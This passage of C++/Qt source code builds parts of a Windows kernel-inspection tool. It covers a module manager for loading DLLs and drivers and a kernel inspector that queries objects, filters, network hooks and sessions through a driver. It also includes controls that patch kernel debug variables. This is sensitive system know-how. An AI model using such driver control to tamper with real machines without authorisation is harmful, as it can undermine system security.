    Interrupt->setEnabled(false);
    return Page;
}

QWidget *CreateModuleManagerPage()
{
    auto *Page = new QWidget;
    auto *Layout = new QVBoxLayout(Page);
    ConfigurePageLayout(Layout, 14);

    auto *Paths = new BodyLabel;
    Paths->setWordWrap(true);
    Paths->setText("Modules: " + ConfigurationPaths("Modules", "./Modules").join("; ") +
                   "\nDrivers: " + ConfigurationPaths("Drivers", "./Drivers").join("; "));
    Layout->addWidget(Paths);

    auto *Toolbar = new QHBoxLayout;
    ConfigureToolbarLayout(Toolbar);
    auto *Search = new SearchLineEdit;
    Search->setPlaceholderText("Search");
    Search->setClearButtonEnabled(true);
    Search->setMaximumWidth(360);
    auto *Kind = new ComboBox;
    Kind->addItems({"All", "DLL modules", "System drivers"});
    Kind->setCurrentIndex(0);
    auto *Remove = MakeButton("Remove");
    auto *AddModule = MakeButton("Load DLL");
    auto *Refresh = MakeButton("Refresh", true);
    Toolbar->addWidget(Search);
    Toolbar->addWidget(Kind);
    Toolbar->addStretch();
    Toolbar->addWidget(Remove);
    Toolbar->addWidget(AddModule);
    Toolbar->addWidget(Refresh);
    Layout->addLayout(Toolbar);

    auto *Table = MakeTable({"Name", "Type", "Author", "State", "Path"});
    Table->setSelectionMode(QAbstractItemView::SingleSelection);
    Table->setContextMenuPolicy(Qt::CustomContextMenu);
    Table->horizontalHeader()->setSectionResizeMode(0, QHeaderView::ResizeToContents);
    Table->horizontalHeader()->setSectionResizeMode(1, QHeaderView::ResizeToContents);
    Table->horizontalHeader()->setSectionResizeMode(2, QHeaderView::ResizeToContents);
    Table->horizontalHeader()->setSectionResizeMode(3, QHeaderView::ResizeToContents);
    Table->horizontalHeader()->setSectionResizeMode(4, QHeaderView::Stretch);
    Layout->addWidget(Table, 1);

    const auto SelectedPath = [Table] {
        const int Row = Table->currentRow();
        return Row < 0 || !Table->item(Row, 0) ? QString() : Table->item(Row, 0)->data(Qt::UserRole).toString();
    };
    const auto SelectedIsDriver = [Table] {
        const int Row = Table->currentRow();
        return Row >= 0 && Table->item(Row, 0) && Table->item(Row, 0)->data(Qt::UserRole + 1).toBool();
    };
    const auto RefreshActions = [Table, Remove] {
        const int Row = Table->currentRow();
        const bool HasSelection = Row >= 0 && Table->item(Row, 0);
        Remove->setEnabled(HasSelection && !ModuleRunning.load());
    };

    const auto Populate = [Kind, Search, Table, RefreshActions] {
        const QString Query = Search->text().trimmed();
        Table->clearContents();
        Table->setRowCount(0);
        const auto AppendModule = [Query, Table](ModuleEntry &Module, bool IsDriver) {
            const QString Name = QString::fromStdString(Module.Name);
            const QString Path = QString::fromStdString(Module.Path);
            const QString Category = QString::fromStdString(Module.Category);
            const QString Author = QString::fromStdString(Module.Author);
            if (IsDriver)
                Module.Loaded = QueryDriverLoadedState(Module);
            if (!Query.isEmpty() && !Name.contains(Query, Qt::CaseInsensitive) &&
                !Path.contains(Query, Qt::CaseInsensitive) && !Category.contains(Query, Qt::CaseInsensitive))
                return;
            const int Row = Table->rowCount();
            Table->insertRow(Row);
            auto *NameItem = new QTableWidgetItem(Name);
            NameItem->setData(Qt::UserRole, Path);
            NameItem->setData(Qt::UserRole + 1, IsDriver);
            Table->setItem(Row, 0, NameItem);
            Table->setItem(Row, 1, new QTableWidgetItem(Category));
            Table->setItem(Row, 2, new QTableWidgetItem(Author));
            Table->setItem(Row, 3, new QTableWidgetItem(Module.Valid ? (Module.Loaded ? "Active" : "Inactive") : "Skipped"));
            auto *PathItem = new QTableWidgetItem(Path);
            PathItem->setToolTip(QString::fromStdString(Module.Description));
            Table->setItem(Row, 4, PathItem);
            Table->setRowHeight(Row, 38);
        };
        if (Kind->currentIndex() != 2)
        {
            for (ModuleEntry &Module : DllModules)
                AppendModule(Module, false);
        }
        if (Kind->currentIndex() != 1)
        {
            for (ModuleEntry &Driver : DriverModules)
                AppendModule(Driver, true);
        }
        RefreshActions();
    };

    QObject::connect(Search, &QLineEdit::textChanged, Page, [Populate](const QString &) { Populate(); });
    QObject::connect(Kind, &ComboBox::currentIndexChanged, Page, [Populate](int) { Populate(); });
    QObject::connect(Table, &QTableWidget::itemSelectionChanged, Page, RefreshActions);
    QObject::connect(Refresh, &QPushButton::clicked, Page, [Page, Populate] {
        if (ModuleRunning.load())
        {
            ShowWarningNotice(Page, "ModuleManager", "Wait for the running module to finish before reloading modules.");
            return;
        }
        ScanRuntimeModules();
        Populate();
        ShowSuccessNotice(Page, "ModuleManager", "Modules reloaded.");
    });
    QObject::connect(AddModule, &QPushButton::clicked, Page, [Page, Kind, Populate] {
        const QString Path = QFileDialog::getOpenFileName(Page, "Select DLL", QString(), "DLL files (*.dll)");
        if (Path.isEmpty())
            return;
        const QString AbsolutePath = QFileInfo(Path).absoluteFilePath();
        const bool Exists = std::any_of(DllModules.begin(), DllModules.end(), [&AbsolutePath](const ModuleEntry &Module) {
            return QString::fromStdString(Module.Path).compare(AbsolutePath, Qt::CaseInsensitive) == 0;
        });
        if (!Exists)
        {
            DllModules.push_back(ProbeModuleFile(AbsolutePath));
            ModuleEntry &Module = DllModules.back();
            if (Module.Valid && ConfigurationValue("Modules", "AutoLoad", true).toBool())
                LoadModuleInstance(Module);
        }
        Kind->setCurrentIndex(0);
        Populate();
        ShowSuccessNotice(Page, "ModuleManager", Exists ? "Module is already in the list." : "DLL module added.");
    });
    QObject::connect(Remove, &QPushButton::clicked, Page, [Page, SelectedPath, SelectedIsDriver, Populate] {
        const QString Path = SelectedPath();
        if (Path.isEmpty())
            return;
        const bool IsDriver = SelectedIsDriver();
        std::vector<ModuleEntry> &List = IsDriver ? DriverModules : DllModules;
        const auto Entry = std::find_if(List.begin(), List.end(), [&Path](const ModuleEntry &Module) {
            return QString::fromStdString(Module.Path) == Path;
        });
        if (Entry == List.end())
            return;
        if (Entry->Loaded)
        {
            QString Error;
            const bool Ok = IsDriver ? SetDriverLoaded(*Entry, false, &Error)
                                     : (DestroyModuleInstance(*Entry), true);
            if (!Ok)
            {
                ShowErrorNotice(Page, "ModuleManager", Error);
                return;
            }
        }
        List.erase(Entry);
        Populate();
        ShowSuccessNotice(Page, "ModuleManager", "Item removed from the module list.");
    });
    QObject::connect(Table, &QWidget::customContextMenuRequested, Page,
                     [Page, Table, Populate](const QPoint &Position) {
        const QModelIndex Index = Table->indexAt(Position);
        if (!Index.isValid() || ModuleRunning.load())
            return;
        Table->selectRow(Index.row());
        QTableWidgetItem *NameItem = Table->item(Index.row(), 0);
        if (!NameItem)
            return;
        const QString Path = NameItem->data(Qt::UserRole).toString();
        const bool IsDriver = NameItem->data(Qt::UserRole + 1).toBool();
        std::vector<ModuleEntry> &List = IsDriver ? DriverModules : DllModules;
        const auto Entry = std::find_if(List.begin(), List.end(), [&Path](const ModuleEntry &Module) {
            return QString::fromStdString(Module.Path) == Path;
        });
        if (Entry == List.end())
            return;

        auto *Menu = new RoundMenu(QString(), Page);
        auto *ToggleAction = new QAction(Entry->Loaded ? "Unload" : "Load", Menu);
        ToggleAction->setEnabled(Entry->Valid);
        Menu->addAction(ToggleAction);
        ConnectMenuAction(ToggleAction, Page,
                         [Page, Path, IsDriver, Populate] {
            std::vector<ModuleEntry> &TargetList = IsDriver ? DriverModules : DllModules;
            const auto Target = std::find_if(TargetList.begin(), TargetList.end(), [&Path](const ModuleEntry &Module) {
                return QString::fromStdString(Module.Path) == Path;
            });
            if (Target == TargetList.end())
                return;
            QString Error;
            bool Ok = false;
            if (IsDriver)
                Ok = SetDriverLoaded(*Target, !Target->Loaded, &Error);
            else if (Target->Loaded)
            {
                DestroyModuleInstance(*Target);
                Ok = true;
            }
            else
                Ok = LoadModuleInstance(*Target, &Error);
            if (!Ok)
                ShowErrorNotice(Page, "ModuleManager", Error.isEmpty() ? "The operation failed." : Error);
            else
                ShowSuccessNotice(Page, "ModuleManager", IsDriver ? "Driver state updated." : "Module state updated.");
            QTimer::singleShot(0, Page, Populate);
        });
        ReleaseMenuAfterClose(Menu);
        Menu->exec(Table->viewport()->mapToGlobal(Position));
    });

    EnsureRuntimeModulesScanned();
    Populate();
    return Page;
}

QWidget *CreateKernelInspectorPage()
{
    struct InspectorTab {
        DWORD Ioctl;
        QString Path;
        QTableWidget *Table = nullptr;
        BodyLabel *Count = nullptr;
    };
    struct DebugWidgets {
        BodyLabel *Summary = nullptr;
        BodyLabel *Count = nullptr;
        QTableWidget *Table = nullptr;
        PushButton *Enable = nullptr;
        PushButton *Disable = nullptr;
    };
    auto *Page = new QWidget;
    auto *Layout = new QVBoxLayout(Page);
    ConfigurePageLayout(Layout);

    auto *Header = new QWidget;
    auto *HeaderLayout = new QHBoxLayout(Header);
    HeaderLayout->setContentsMargins(0, 0, 0, 0);
    HeaderLayout->setSpacing(12);
    auto *IconHost = new QWidget;
    IconHost->setFixedSize(44, 44);
    const QColor Accent = ConfiguredColor("AccentColor", KAccent);
    IconHost->setStyleSheet(QString("background: rgba(%1,%2,%3,%4); border-radius: 8px;")
        .arg(Accent.red()).arg(Accent.green()).arg(Accent.blue()).arg(40));
    auto *IconLayout = new QVBoxLayout(IconHost);
    IconLayout->setContentsMargins(0, 0, 0, 0);
    IconLayout->addWidget(MakeGlyph(Fluent::IconType::SEARCH, 22), 0, Qt::AlignCenter);
    HeaderLayout->addWidget(IconHost);
    auto *TitleLayout = new QVBoxLayout;
    TitleLayout->setContentsMargins(0, 0, 0, 0);
    TitleLayout->setSpacing(2);
    TitleLayout->addWidget(MakeLabel("Kernel Inspector", 17, KTextPrimary, QFont::DemiBold));
    TitleLayout->addWidget(MakeLabel("MultiDrv V2", 10, KTextMuted, QFont::Medium));
    HeaderLayout->addLayout(TitleLayout, 1);
    auto *Search = new SearchLineEdit;
    Search->setPlaceholderText("Filter current results");
    Search->setClearButtonEnabled(true);
    Search->setMaximumWidth(300);
    HeaderLayout->addWidget(Search);
    auto *Status = new BodyLabel("Ready");
    auto *Loading = new IndeterminateProgressRing(Page, false);
    Loading->setFixedSize(22, 22);
    Loading->hide();
    auto *Refresh = new PushButton("Refresh", Fluent::IconType::SYNC);
    HeaderLayout->addWidget(Status);
    HeaderLayout->addWidget(Loading);
    HeaderLayout->addWidget(Refresh);
    Layout->addWidget(Header);

    auto *Tabs = new TabBar;
    Tabs->setAddButtonVisible(false);
    Tabs->setTabsClosable(false);
    Tabs->setMovable(false);
    auto *Pages = new QStackedWidget;
    Layout->addWidget(Tabs);
    Layout->addWidget(Pages, 1);
    auto State = std::make_shared<std::vector<InspectorTab>>();
    auto DebugStateUi = std::make_shared<DebugWidgets>();
    {
        auto *TabPage = new QWidget;
        auto *TabLayout = new QVBoxLayout(TabPage);
        TabLayout->setContentsMargins(0, 0, 0, 0);
        TabLayout->setSpacing(8);

        auto *MetaLayout = new QHBoxLayout;
        MetaLayout->setContentsMargins(2, 0, 2, 0);
        DebugStateUi->Summary = new BodyLabel("Current debug state: Unknown");
        DebugStateUi->Count = new BodyLabel("0 variables");
        DebugStateUi->Enable = new PushButton("EnableDebug");
        DebugStateUi->Disable = new PushButton("DisableDebug");
        MetaLayout->addWidget(DebugStateUi->Summary);
        MetaLayout->addStretch();
        MetaLayout->addWidget(DebugStateUi->Count);
        MetaLayout->addWidget(DebugStateUi->Enable);
        MetaLayout->addWidget(DebugStateUi->Disable);
        TabLayout->addLayout(MetaLayout);

        DebugStateUi->Table = MakeTable({"Variable", "Found", "Address", "Original", "Current", "Desired", "State"});
        DebugStateUi->Table->setSortingEnabled(true);
        DebugStateUi->Table->setTextElideMode(Qt::ElideRight);
        DebugStateUi->Table->horizontalHeader()->setSectionResizeMode(0, QHeaderView::ResizeToContents);
        DebugStateUi->Table->horizontalHeader()->setSectionResizeMode(1, QHeaderView::ResizeToContents);
        DebugStateUi->Table->horizontalHeader()->setSectionResizeMode(2, QHeaderView::ResizeToContents);
        DebugStateUi->Table->horizontalHeader()->setSectionResizeMode(3, QHeaderView::ResizeToContents);
        DebugStateUi->Table->horizontalHeader()->setSectionResizeMode(4, QHeaderView::ResizeToContents);
        DebugStateUi->Table->horizontalHeader()->setSectionResizeMode(5, QHeaderView::ResizeToContents);
        DebugStateUi->Table->horizontalHeader()->setSectionResizeMode(6, QHeaderView::Stretch);
        TabLayout->addWidget(DebugStateUi->Table, 1);

        Tabs->addTab("kernel-debug", "Debug", Fluent::IconType::DEVELOPER_TOOLS);
        Pages->addWidget(TabPage);
    }
    const std::array<std::tuple<DWORD, const char*, const wchar_t*, Fluent::IconType>, 8> Definitions{{
        {IOCTL_QUERY_MEMORY_V2, "Memory", L"", Fluent::IconType::TILES},
        {IOCTL_ENUM_BIG_POOL_V2, "Big Pool", L"", Fluent::IconType::LAYOUT},
        {IOCTL_ENUM_OBJECTS_V2, "Objects", L"\\Driver", Fluent::IconType::LINK},
        {IOCTL_ENUM_MINIFILTERS_V2, "MiniFilters", L"", Fluent::IconType::DOCUMENT},
        {IOCTL_ENUM_WFP_V2, "WFP", L"", Fluent::IconType::GLOBE},
        {IOCTL_ENUM_NDIS_V2, "NDIS", L"", Fluent::IconType::CONNECT},
        {IOCTL_QUERY_SECURITY_V2, "Security", L"", Fluent::IconType::CERTIFICATE},
        {IOCTL_ENUM_KERNEL_MODULES_V2, "Cross-view", L"", Fluent::IconType::VIEW}
    }};
    int TabIndex = 0;
    for (const auto &[Ioctl, Name, Path, Icon] : Definitions) {
        auto *TabPage = new QWidget;
        auto *TabLayout = new QVBoxLayout(TabPage);
        TabLayout->setContentsMargins(0, 0, 0, 0);
        TabLayout->setSpacing(8);
        auto *MetaLayout = new QHBoxLayout;
        MetaLayout->setContentsMargins(2, 0, 2, 0);
        auto *Count = new BodyLabel("0 records");
        MetaLayout->addStretch();
        MetaLayout->addWidget(Count);
        TabLayout->addLayout(MetaLayout);
        auto *Table = MakeTable({"Name", "Type", "Address", "Size/Value", "Path/Detail", "Source", "Confidence", "Status"});
        Table->setSortingEnabled(true);
        Table->setTextElideMode(Qt::ElideRight);
        Table->horizontalHeader()->setSectionResizeMode(0, QHeaderView::ResizeToContents);
        Table->horizontalHeader()->setSectionResizeMode(1, QHeaderView::ResizeToContents);
        Table->horizontalHeader()->setSectionResizeMode(2, QHeaderView::ResizeToContents);
        Table->horizontalHeader()->setSectionResizeMode(3, QHeaderView::ResizeToContents);
        Table->horizontalHeader()->setSectionResizeMode(4, QHeaderView::Stretch);
        Table->horizontalHeader()->setSectionResizeMode(5, QHeaderView::ResizeToContents);
        Table->horizontalHeader()->setSectionResizeMode(6, QHeaderView::ResizeToContents);
        Table->horizontalHeader()->setSectionResizeMode(7, QHeaderView::ResizeToContents);
        TabLayout->addWidget(Table, 1);
        Tabs->addTab(QString("kernel-%1").arg(TabIndex++), Name, Icon);
        Pages->addWidget(TabPage);
        State->push_back({Ioctl, QString::fromWCharArray(Path), Table, Count});
    }
    
    auto *SyncTab = new QWidget;
    auto *SyncLayout = new QVBoxLayout(SyncTab);
    SyncLayout->setContentsMargins(0, 0, 0, 0);
    SyncLayout->setSpacing(8);
    auto *SyncMeta = new QHBoxLayout; SyncMeta->setContentsMargins(2, 0, 2, 0);
    auto *SyncCount = new BodyLabel("0 objects");
    SyncMeta->addStretch(); SyncMeta->addWidget(SyncCount);
    SyncLayout->addLayout(SyncMeta);
    auto *SyncTable = MakeTable({"Name", "Type", "Dir", "Extra"});
    SyncTable->setSortingEnabled(true);
    SyncTable->setTextElideMode(Qt::ElideRight);
    SyncTable->horizontalHeader()->setSectionResizeMode(0, QHeaderView::Stretch);
    SyncLayout->addWidget(SyncTable, 1);
    Tabs->addTab("kernel-sync", "Sync Objects", Fluent::IconType::SYNC);
    Pages->addWidget(SyncTab);

    
    auto *SessTab = new QWidget;
    auto *SessLayout = new QVBoxLayout(SessTab);
    SessLayout->setContentsMargins(0, 0, 0, 0);
    SessLayout->setSpacing(8);
    auto *SessMeta = new QHBoxLayout; SessMeta->setContentsMargins(2, 0, 2, 0);
    auto *SessCount = new BodyLabel("0 sessions");
    SessMeta->addStretch(); SessMeta->addWidget(SessCount);
    SessLayout->addLayout(SessMeta);
    auto *SessTable = MakeTable({"Session", "State", "ProcessCount", "WinStation"});
    SessTable->setSortingEnabled(true);
    SessTable->setTextElideMode(Qt::ElideRight);
    SessTable->horizontalHeader()->setSectionResizeMode(0, QHeaderView::ResizeToContents);
    SessTable->horizontalHeader()->setSectionResizeMode(3, QHeaderView::Stretch);
    SessTable->setContextMenuPolicy(Qt::CustomContextMenu);
    SessLayout->addWidget(SessTable, 1);
    Tabs->addTab("kernel-session", "Sessions", Fluent::IconType::PEOPLE);
    Pages->addWidget(SessTab);

    
    auto *FwTab = new QWidget;
    auto *FwLayout = new QVBoxLayout(FwTab);
    FwLayout->setContentsMargins(0, 0, 0, 0);
    FwLayout->setSpacing(8);
    auto *FwMeta = new QHBoxLayout; FwMeta->setContentsMargins(2, 0, 2, 0);
    auto *FwCount = new BodyLabel("0 rules");
    auto *FwAddBtn = new PushButton("Add Rule");
    FwMeta->addStretch(); FwMeta->addWidget(FwCount); FwMeta->addWidget(FwAddBtn);
    FwLayout->addLayout(FwMeta);
    auto *FwTable = MakeTable({"Name", "Action", "Protocol", "Port", "State"});
    FwTable->setSortingEnabled(true);
    FwTable->setTextElideMode(Qt::ElideRight);
    FwTable->horizontalHeader()->setSectionResizeMode(0, QHeaderView::Stretch);
    FwTable->setContextMenuPolicy(Qt::CustomContextMenu);
    FwLayout->addWidget(FwTable, 1);
    Tabs->addTab("kernel-fw", "Firewall", Fluent::IconType::GLOBE);
    Pages->addWidget(FwTab);

    QObject::connect(Tabs, &TabBar::currentChanged, Pages, &QStackedWidget::setCurrentIndex);
    QObject::connect(Pages, &QStackedWidget::currentChanged, Tabs, &TabBar::setCurrentIndex);
    const auto ApplyFilter = [Search, State, DebugStateUi, SyncTable, SessTable, FwTable] {
        const QString Query = Search->text().trimmed();
        const auto FilterTable = [&Query](QTableWidget *Table) {
            for (int Row = 0; Row < Table->rowCount(); ++Row) {
                QString RowText;
                for (int Column = 0; Column < Table->columnCount(); ++Column)
                    if (const QTableWidgetItem *Item = Table->item(Row, Column)) RowText += Item->text() + ' ';
                Table->setRowHidden(Row, !Query.isEmpty() && !RowText.contains(Query, Qt::CaseInsensitive));
            }
        };
        FilterTable(DebugStateUi->Table);
        for (const InspectorTab &Tab : *State) FilterTable(Tab.Table);
        FilterTable(SyncTable);
        FilterTable(SessTable);
        FilterTable(FwTable);
    };
    QObject::connect(Search, &QLineEdit::textChanged, Page, [ApplyFilter] { ApplyFilter(); });
    QObject::connect(Refresh, &QPushButton::clicked, Page, [Page, Refresh, Status, Loading, State, DebugStateUi, ApplyFilter,
        SyncTable, SyncCount, SessTable, SessCount, FwTable, FwCount] {
        Refresh->setEnabled(false);
        DebugStateUi->Enable->setEnabled(false);
        DebugStateUi->Disable->setEnabled(false);
        Refresh->setText("Refreshing...");
        Status->setText("Reading kernel inventory...");
        Loading->show();
        Loading->start();
        QPointer<QWidget> SafePage(Page);
        std::thread([SafePage, Refresh, Status, Loading, State, DebugStateUi, ApplyFilter,
                     SyncTable, SyncCount, SessTable, SessCount, FwTable, FwCount] {
            struct DebugResult {
                bool Success = false;
                DWORD ErrorCode = ERROR_SUCCESS;
                DEBUG_STATE_OUTPUT State{};
            };
            struct Result { MDV2_LIST_HEADER Header{}; std::vector<MDV2_RECORD> Records; };
            DebugResult DebugResultData;
            DebugResultData.Success = QueryDebugState(&DebugResultData.State);
            DebugResultData.ErrorCode = G_LastMultiDrvError;
            std::vector<Result> Results(State->size());
            for (size_t Index = 0; Index < State->size(); ++Index) {
                MDV2_QUERY_INPUT Request{}; Request.MaxEntries = MDV2_MAX_PAGE_RECORDS;
                if (!(*State)[Index].Path.isEmpty()) wcsncpy_s(Request.Path, (*State)[Index].Path.toStdWString().c_str(), _TRUNCATE);
                QueryMultiDrvRecordsV2((*State)[Index].Ioctl, Request, Results[Index].Records, &Results[Index].Header);
            }

            
            std::vector<std::tuple<QString, QString, ULONG>> SyncEntries;
            if (G_DeviceHandle != INVALID_HANDLE_VALUE)
            {
                BYTE SyncBuf[65536] = {};
                ULONG SyncReturned = 0;
                if (EnumSyncObjectsKernel(SyncBuf, sizeof(SyncBuf), &SyncReturned) && SyncReturned >= sizeof(ULONG))
                {
                    PULONG Cnt = (PULONG)SyncBuf;
                    PUCHAR D = (PUCHAR)(Cnt + 1);
                    for (ULONG i = 0; i < *Cnt; i++)
                    {
                        ULONG Dir = *(PULONG)D; D += 4;
                        USHORT NLen = *(PUSHORT)D; D += 2;
                        QString Name = NLen ? QString::fromWCharArray((PWCHAR)D, NLen / sizeof(WCHAR)) : QString();
                        D += NLen;
                        USHORT TLen = *(PUSHORT)D; D += 2;
                        QString Type = TLen ? QString::fromWCharArray((PWCHAR)D, TLen / sizeof(WCHAR)) : QString();
                        D += TLen;
                        D = (PUCHAR)(((ULONG_PTR)D + 3) & ~3ULL);
                        SyncEntries.emplace_back(Name, Type, Dir);
                    }
                }
            }

            
            std::vector<std::tuple<ULONG, ULONG, ULONG, QString>> SessEntries;
            if (G_DeviceHandle != INVALID_HANDLE_VALUE)
            {
                BYTE SessBuf[4096] = {};
                ULONG SessReturned = 0;
                if (EnumSessions(SessBuf, sizeof(SessBuf), &SessReturned) && SessReturned >= sizeof(ULONG))
                {
                    PULONG Cnt = (PULONG)SessBuf;
                    PUCHAR D = (PUCHAR)(Cnt + 1);
                    for (ULONG i = 0; i < *Cnt; i++)
                    {
                        ULONG Sid = *(PULONG)D; D += 4;
                        ULONG St = *(PULONG)D; D += 4;
                        ULONG Pc = *(PULONG)D; D += 4;
                        QString Ws = QString::fromWCharArray((PWCHAR)D);
                        D += 64;
                        SessEntries.emplace_back(Sid, St, Pc, Ws);
                    }
                }
            }
            if (SessEntries.empty())
                EnumerateSessionsFallback(SessEntries);

            
            std::vector<std::tuple<QString, ULONG, ULONG, ULONG, QString>> FwEntries;
            if (G_DeviceHandle != INVALID_HANDLE_VALUE)
            {
                BYTE FwBuf[16384] = {};
                (void)FwBuf;
            }
            if (FwEntries.empty())
                EnumerateFirewallRulesFallback(FwEntries);
            if (FwEntries.empty())
                FwEntries.emplace_back("Firewall enumeration unavailable", 0, 0, 0, "Not implemented");

            if (SyncEntries.empty())
                EnumerateSyncObjectsFallback(SyncEntries);

            QMetaObject::invokeMethod(qApp, [SafePage, Refresh, Status, Loading, State, DebugStateUi, ApplyFilter,
                                             DebugResultData, Results = std::move(Results),
                                             SyncTable, SyncCount, SyncEntries = std::move(SyncEntries),
                                             SessTable, SessCount, SessEntries = std::move(SessEntries),
                                             FwTable, FwCount, FwEntries = std::move(FwEntries)]() mutable {
                if (!SafePage) return;
                const auto Hex = [](qulonglong Value) { return QString("0x%1").arg(Value, 0, 16).toUpper(); };
                const auto SourceName = [](ULONG Source) {
                    static const std::array<const char *, 10> Names{
                        "Unknown", "Public API", "System Info", "Object Manager", "Registry",
                        "Process Environment", "Memory Map", "Version Profile", "Signature Scan", "Cross-view"};
                    return Source < Names.size() ? QString::fromLatin1(Names[Source]) : QString("Source %1").arg(Source);
                };
                const auto ConfidenceName = [](ULONG Confidence) {
                    static const std::array<const char *, 4> Names{"Unavailable", "Low", "Medium", "High"};
                    return Confidence < Names.size() ? QString::fromLatin1(Names[Confidence]) : QString("Level %1").arg(Confidence);
                };
                const auto ByteValue = [](UCHAR Value) { return QString("0x%1").arg(Value, 2, 16, QLatin1Char('0')).toUpper(); };
                size_t TotalRecords = 0;
                DebugStateUi->Table->setSortingEnabled(false);
                DebugStateUi->Table->clearContents();
                DebugStateUi->Table->setRowCount(0);
                if (DebugResultData.Success) {
                    int EnabledCount = 0;
                    for (int Index = 0; Index < DEBUG_VAR_COUNT; ++Index) {
                        const DEBUG_VAR_ENTRY &Entry = DebugResultData.State.Vars[Index];
                        const bool IsEnabled = Entry.Found && Entry.CurrentValue == Entry.DesiredEnabledValue;
                        if (IsEnabled)
                            ++EnabledCount;
                        const int Row = DebugStateUi->Table->rowCount();
                        DebugStateUi->Table->insertRow(Row);
                        const QStringList Values{
                            QString::fromWCharArray(Entry.Name),
                            Entry.Found ? "Yes" : "No",
                            Entry.Address ? Hex(Entry.Address) : "-",
                            ByteValue(Entry.OriginalValue),
                            ByteValue(Entry.CurrentValue),
                            ByteValue(Entry.DesiredEnabledValue),
                            !Entry.Found ? "Not found" : (IsEnabled ? "Enabled target applied" : "Disabled / mismatched")
                        };
                        for (int Column = 0; Column < Values.size(); ++Column)
                            DebugStateUi->Table->setItem(Row, Column, new QTableWidgetItem(Values[Column]));
                        DebugStateUi->Table->setRowHeight(Row, 36);
                    }
                    const QString OverallState =
                        DebugResultData.State.TotalFound == 0 ? "Unavailable" :
                        (EnabledCount == static_cast<int>(DebugResultData.State.TotalFound) ? "Enabled" :
                         (EnabledCount == 0 ? "Disabled" : "Partial"));
                    DebugStateUi->Summary->setText(QString("Current debug state: %1").arg(OverallState));
                    DebugStateUi->Count->setText(QString("%1/%2 variables found, %3 patched")
                        .arg(DebugResultData.State.TotalFound)
                        .arg(DEBUG_VAR_COUNT)
                        .arg(DebugResultData.State.PatchedSuccessCount));
                } else {
                    DebugStateUi->Table->insertRow(0);
                    DebugStateUi->Table->setItem(0, 0, new QTableWidgetItem("Debug state query failed"));
                    DebugStateUi->Table->setItem(0, 6, new QTableWidgetItem(QString("Win32 error %1").arg(DebugResultData.ErrorCode)));
                    DebugStateUi->Summary->setText("Current debug state: Query failed");
                    DebugStateUi->Count->setText("0 variables");
                }
                DebugStateUi->Table->setSortingEnabled(true);
                for (size_t Index = 0; Index < State->size(); ++Index) {
                    QTableWidget *Table = (*State)[Index].Table; Table->setSortingEnabled(false); Table->clearContents(); Table->setRowCount(0);
                    for (const auto &Record : Results[Index].Records) {
                        const int Row = Table->rowCount(); Table->insertRow(Row);
                        const QString PathText = QString::fromWCharArray(Record.Path);
                        const QString DetailText = QString::fromWCharArray(Record.Detail);
                        const QString Detail = PathText.isEmpty() ? DetailText :
                            (DetailText.isEmpty() ? PathText : PathText + " | " + DetailText);
                        const QString StatusText = Record.Status == 0 ? "Success" : Hex(static_cast<quint32>(Record.Status));
                        const QStringList Values{QString::fromWCharArray(Record.Name), QString::fromWCharArray(Record.TypeName),
                            Record.Address ? Hex(Record.Address) : "-",
                            Record.SizeBytes ? QLocale().toString(static_cast<qulonglong>(Record.SizeBytes)) + " B" : Hex(Record.Value[0]), Detail,
                            SourceName(Record.Source), ConfidenceName(Record.Confidence), StatusText};
                        for (int Column = 0; Column < Values.size(); ++Column) Table->setItem(Row, Column, new QTableWidgetItem(Values[Column]));
                        Table->setRowHeight(Row, 36);
                    }
                    TotalRecords += Results[Index].Records.size();
                    (*State)[Index].Count->setText(QString("%1 record%2")
                        .arg(Results[Index].Records.size()).arg(Results[Index].Records.size() == 1 ? "" : "s"));
                    if (Results[Index].Records.empty()) {
                        Table->insertRow(0);
                        Table->setItem(0, 0, new QTableWidgetItem("No records"));
                        Table->setItem(0, 7, new QTableWidgetItem(Results[Index].Header.Status == 0
                            ? "Success" : Hex(static_cast<quint32>(Results[Index].Header.Status))));
                    }
                    Table->setSortingEnabled(true);
                }
                
                SyncTable->setSortingEnabled(false);
                SyncTable->clearContents(); SyncTable->setRowCount(0);
                for (const auto &[Name, Type, Dir] : SyncEntries) {
                    int R = SyncTable->rowCount(); SyncTable->insertRow(R);
                    SyncTable->setItem(R, 0, new QTableWidgetItem(Name));
                    SyncTable->setItem(R, 1, new QTableWidgetItem(Type));
                    SyncTable->setItem(R, 2, new QTableWidgetItem(Dir == 0 ? "Global" : "Session"));
                    SyncTable->setRowHeight(R, 36);
                }
                SyncCount->setText(QString("%1 objects").arg(SyncEntries.size()));
                SyncTable->setSortingEnabled(true);

                
                SessTable->setSortingEnabled(false);
                SessTable->clearContents(); SessTable->setRowCount(0);
                for (const auto &[Sid, St, Pc, Ws] : SessEntries) {
                    int R = SessTable->rowCount(); SessTable->insertRow(R);
                    SessTable->setItem(R, 0, new QTableWidgetItem(QString::number(Sid)));
                    SessTable->setItem(R, 1, new QTableWidgetItem(SessionStateText(St)));
                    SessTable->setItem(R, 2, new QTableWidgetItem(QString::number(Pc)));
                    SessTable->setItem(R, 3, new QTableWidgetItem(Ws));
                    SessTable->setRowHeight(R, 36);
                }
                SessCount->setText(QString("%1 sessions").arg(SessEntries.size()));
                SessTable->setSortingEnabled(true);

                
                FwTable->setSortingEnabled(false);
                FwTable->clearContents(); FwTable->setRowCount(0);
                for (const auto &[Name, Action, Proto, Port, StateText] : FwEntries) {
                    int R = FwTable->rowCount(); FwTable->insertRow(R);
                    FwTable->setItem(R, 0, new QTableWidgetItem(Name));
                    FwTable->setItem(R, 1, new QTableWidgetItem(Action == 0 ? "Block" : "Allow"));
                    FwTable->setItem(R, 2, new QTableWidgetItem(Proto == 6 ? "TCP" : Proto == 17 ? "UDP" : QString::number(Proto)));
                    FwTable->setItem(R, 3, new QTableWidgetItem(QString::number(Port)));
                    FwTable->setItem(R, 4, new QTableWidgetItem(StateText));
                    FwTable->setRowHeight(R, 36);
                }
                FwCount->setText(QString("%1 rules").arg(FwEntries.size()));
                FwTable->setSortingEnabled(true);

                ApplyFilter();
                Loading->stop();
                Loading->hide();
                Refresh->setEnabled(true);
                DebugStateUi->Enable->setEnabled(true);
                DebugStateUi->Disable->setEnabled(true);
                Refresh->setText("Refresh");
                Status->setText(QString("%1 records").arg(TotalRecords));
            }, Qt::QueuedConnection);
        }).detach();
    });
    const auto RunDebugAction = [Page, Refresh, Status, Loading, DebugStateUi](bool Enable) {
        DebugStateUi->Enable->setEnabled(false);
        DebugStateUi->Disable->setEnabled(false);
        Refresh->setEnabled(false);
        Status->setText(Enable ? "Enabling kernel debug..." : "Disabling kernel debug...");
        Loading->show();
        Loading->start();
